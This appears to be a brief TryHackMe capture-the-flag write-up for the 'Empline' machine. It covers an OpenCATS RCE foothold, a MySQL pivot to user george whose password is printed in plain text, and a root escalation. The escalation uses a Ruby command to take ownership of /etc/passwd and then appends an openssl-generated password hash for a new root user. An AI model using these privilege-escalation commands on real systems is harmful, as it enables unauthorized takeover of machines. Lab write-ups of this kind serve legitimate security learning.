# Tryhackme Empline Writeup

## Initial foothold

Vhost opencat has vuln to RCE!

## Horizontall Privesc

Mysql to be george

george:pretonnevippasempre

## Root

ruby chown+cp

```bash
george@empline:~$ ruby -e "require 'fileutils'" -e "FileUtils.chown('george','george','/etc/passwd')"
george@empline:~$ ls -la /etc/passwd
-rw-r--r-- 1 george george 1660 Jul 20  2021 /etc/passwd

```

    openssl passwd -1 -salt root2 root   

$1$root2$qP6XJjGSJ/b7ZfJp.GGl80

add this hash in /etc/passwd and su root2 got root



